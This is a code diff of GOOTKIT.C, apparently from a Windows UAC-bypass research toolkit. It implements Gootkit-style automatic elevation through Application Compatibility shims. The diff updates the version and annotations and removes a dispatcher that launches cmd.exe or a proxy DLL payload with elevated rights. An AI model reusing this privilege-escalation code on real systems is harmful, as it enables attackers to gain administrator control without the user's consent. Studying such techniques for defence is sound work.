@@ -5,9 +5,9 @@
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     2.78
+*  VERSION:     2.85
 *
-*  DATE:        30 July 2017
+*  DATE:        01 Dec 2017
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -117,7 +117,7 @@ BOOL ucmRegisterAndRunTarget(
 *
 */
 BOOL ucmShimRedirectEXE(
-    LPWSTR lpszPayloadEXE
+    _In_ LPWSTR lpszPayloadEXE
 )
 {
     BOOL bResult = FALSE;
@@ -212,8 +212,8 @@ BOOL ucmShimRedirectEXE(
 *
 */
 BOOL ucmShimPatch(
-    CONST PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL bResult = FALSE, cond = FALSE;
@@ -334,56 +334,3 @@ BOOL ucmShimPatch(
     return bResult;
 }
 #endif /* _WIN64 */
-
-/*
-* ucmAppcompatElevation
-*
-* Purpose:
-*
-* AutoElevation using Application Compatibility engine.
-*
-*/
-BOOL ucmAppcompatElevation(
-    UCM_METHOD Method,
-    CONST PVOID ProxyDll,
-    DWORD ProxyDllSize,
-    LPWSTR lpszPayloadEXE
-)
-{
-    BOOL    bCond = FALSE, bResult = FALSE;
-    WCHAR   szBuffer[MAX_PATH + 1];
-
-#ifdef _WIN64
-    UNREFERENCED_PARAMETER(ProxyDll);
-    UNREFERENCED_PARAMETER(ProxyDllSize);
-    UNREFERENCED_PARAMETER(lpszPayloadEXE);
-#endif
-
-    do {
-
-        //create and register shim with RedirectEXE, cmd.exe as payload
-        if (Method == UacMethodRedirectExe) {
-            if (lpszPayloadEXE == NULL) {
-                _strcpy_w(szBuffer, T_DEFAULT_CMD);
-                bResult = ucmShimRedirectEXE(szBuffer);
-                break;
-            }
-            else {
-                bResult = ucmShimRedirectEXE(lpszPayloadEXE);
-                break;
-            }
-        }
-        //create and register shim patch with fubuki as payload
-        if (Method == UacMethodShimPatch) {
-#ifndef _WIN64 
-            bResult = ucmShimPatch(ProxyDll, ProxyDllSize);
-#else
-            bResult = FALSE;
-            break;
-#endif
-    }
-
-} while (bCond);
-
-return bResult;
-}
